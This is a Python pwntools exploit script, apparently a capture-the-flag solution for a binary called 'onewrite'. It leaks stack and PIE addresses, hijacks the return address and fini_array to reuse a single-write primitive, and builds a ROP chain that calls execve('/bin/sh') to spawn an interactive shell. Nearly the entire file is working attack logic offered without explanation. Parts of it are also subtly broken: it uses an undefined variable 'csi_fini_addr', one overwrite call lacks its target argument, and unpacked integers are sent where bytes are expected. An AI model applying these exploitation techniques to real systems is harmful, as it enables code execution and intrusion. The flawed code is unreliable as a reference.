from pwn import *

# context.log_level = 'debug'


def leak(target, num):
  target.recvuntil(b' > ')
  target.sendline(str(num).encode('utf-8'))
  leak_str = target.recvline().rstrip().decode()
  return int(leak_str, 16)


def overwrite(target, addr, val):
  target.recvuntil(b'address : ')
  target.send(hex(addr).encode('utf-8'))
  target.recvuntil(b'data : ')
  target.send(val)


def main():
  elf = ELF('./onewrite')
  target = process('./onewrite')
  stack_addr = leak(target, 1)
  rip_addr = stack_addr + 0x18
  csi_rip_addr = stack_addr - 72
  overwrite(target, rip_addr, p8(0x04))

  do_leak_addr = leak(target, 2)
  pie_base_addr = do_leak_addr - elf.symbols['do_leak']
  fini_array_addr = pie_base_addr + \
      elf.symbols['__do_global_dtors_aux_fini_array_entry']
  csu_fini_addr = pie_base_addr + elf.symbols['__libc_csu_fini']
  do_overwrite_addr = pie_base_addr + elf.symbols['do_overwrite']
  overwrite(target, rip_addr, p8(0x04))

  leak(target, 1)

  overwrite(target, fini_array_addr+8, p64(do_overwrite_addr))
  overwrite(target, fini_array_addr, p64(do_overwrite_addr))
  overwrite(target, csi_rip_addr, p64(csi_fini_addr))

  csi_rip_addr += 8

  pop_rdi_addr = pie_base_addr + 0x84fa
  pop_rsi_addr = pie_base_addr + 0xd9f2
  pop_rdx_addr = pie_base_addr + 0x484c5
  pop_rax_addr = pie_base_addr + 0x460ac
  syscall_addr = pie_base_addr + 0x917c
  bin_sh_addr = do_leak_addr + 0x2aa99b
  pivot_gadget_addr = pie_base_addr + 0x106f3

  def writeQword(adr, val):
    nonlocal csi_rip_addr
    overwrite(target, adr, val)
    overwrite(target, csi_rip_addr, csu_fini_addr)
    csi_rip_addr += 8

  writeQword(stack_addr + 0xd0, pop_rdi_addr)
  writeQword(stack_addr + 0xd8, bin_sh_addr)
  writeQword(stack_addr + 0xe0, pop_rsi_addr)
  writeQword(stack_addr + 0xe8, 0)
  writeQword(stack_addr + 0xf0, pop_rdx_addr)
  writeQword(stack_addr + 0xf8, 0)
  writeQword(stack_addr + 0x100, pop_rax_addr)
  writeQword(stack_addr + 0x108, 59)
  writeQword(stack_addr + 0x110, syscall_addr)

  overwrite(stack_addr - 0x10, pivot_gadget_addr)

  target.interactive()


if __name__ == '__main__':
  main()
